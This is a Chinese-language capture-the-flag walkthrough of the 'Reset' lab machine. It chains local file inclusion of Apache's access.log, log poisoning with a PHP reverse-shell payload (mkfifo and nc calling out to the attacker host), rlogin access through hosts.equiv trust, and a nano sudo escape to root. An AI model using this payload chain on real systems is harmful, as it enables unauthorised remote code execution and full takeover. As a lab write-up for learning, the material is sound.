## Reset

#### 这是一个找不到域名的靶机，不重要！
#### 这是一个password_hash 值为无法通过常规字典（如 rockyou.txt）爆破的强 SHA1的 一个包含弱身份验证机制的 Web 应用靶机，不重要！

![夜深晨早打靶机](images/073101.png)
## buripsuite 的三段拦截 同个页面

### 1. 关于BurpSuite 的 主动利用漏洞的中间人攻击技术流程
![夜深晨早打靶机](images/073102.png)
Web 应用的密码重置功能，在浏览器的开发者工具中 (F12 → Network)获得密码后，登陆 开始拦截
#### [1]获得POST，Ctrl+R,Shift+Ctrl+R 修改file=为/%2Fvar/%2Flog/%2Fapache2/%2Faccess.log  Send，回应有User-Agent字段 ,Forward 
漏洞类型：本地文件包含（LFI）
#### [2]点击同个浏览器页面，获得POST，Ctrl+R,Shift+Ctrl+R 修改User-Agent:为
```
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 主机IP不是目标IP 9090 >/tmp/f'); ?>
```
Send,Forward 
漏洞类型：日志注入（Log Poisoning,攻击载体：User-Agent header 注入 PHP payload
#### [3]点击同个浏览器页面，获得POST，Ctrl+R,Shift+Ctrl+R 修改file=为/%2Fvar/%2Flog/%2Fapache2/%2Faccess.log 
```
nc -lvnp 9090
```
Send  连接上nc 
漏洞类型：命令执行（RCE）,通过 LFI 包含 access.log，实现服务器端 payload 执行
下面是短暂的远程交互：
```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@reset:/var/www/html$ export TERM=xterm
www-data@reset:/var/www/html$ whoami

www-data@reset:/var/www/html$ ls
dashboard.php index.php private_34eee5d2 reset_password.php
www-data@reset:/var/www/html$ cat /etc/hosts.equiv   //“信任主机+用户”免密码远程访问的配置
```
![夜深晨早打靶机](images/073103.png)
+sadm 允许所有主机以 sadm 用户身份信任连接（允许免密码 rsh 登录）

## 什么是rlogin ,第一次见在本机上添加sudo 用户就可以远程连接上
rlogin（Remote Login）是一个远程登录协议，比 SSH 更早诞生

为什么在本机添加了同名用户就能连接？

/etc/hosts.equiv表示该机器 信任所有从某些 IP 发起的请求，只要用户名匹配就可以免密码登录

```
$ sudo useradd sadm
$ sudo passwd sadm

$ su sadm

$ rlogin sadm@IP
sadm@reset:~$

$ ps aux

$ tmux attach -t sadm_session //tmux 是 Terminal Multiplexer（终端复用器）// 是一条用于 连接（附着）到指定 tmux 会话 的命令

$ sudo nano /etc/firewall.sh //	通常放置自定义防火墙规则脚本的位置

//特别是当你只能用 nano 编辑文件，却希望能在其中执行命令时
//Ctrl + R  进入“读取文件”模式（Read File）
//然后按 Ctrl + X  （在某些系统中）触发命令执行模式

//一旦我们进入纳米界面，我们可以按Ctrl+r，然后按Ctrl+x，这允许我们执行来自纳米界面的命令。

//进入这个提示符后，应该输入以下命令，以root身份进入系统shell。

reset; bash 1>&0 2>&0 //获得了一个交互式 shell，重置终端并打开交互 shell

root@reset:/home/sadm# whoami
root
```

### 总结
```
sadm@reset:~$ tmux attach -t sadm_session
# 进入一个被限制命令的tmux界面

# 在里面可以运行 sudo nano /etc/firewall.sh
# 其他命令被限制或不可用

# 使用 Ctrl+R，然后 Ctrl+X
# 执行 reset; bash 1>&0 2>&0
# 成功获得 /bin/bash
```
通过 nano 执行命令逃逸出受限环境
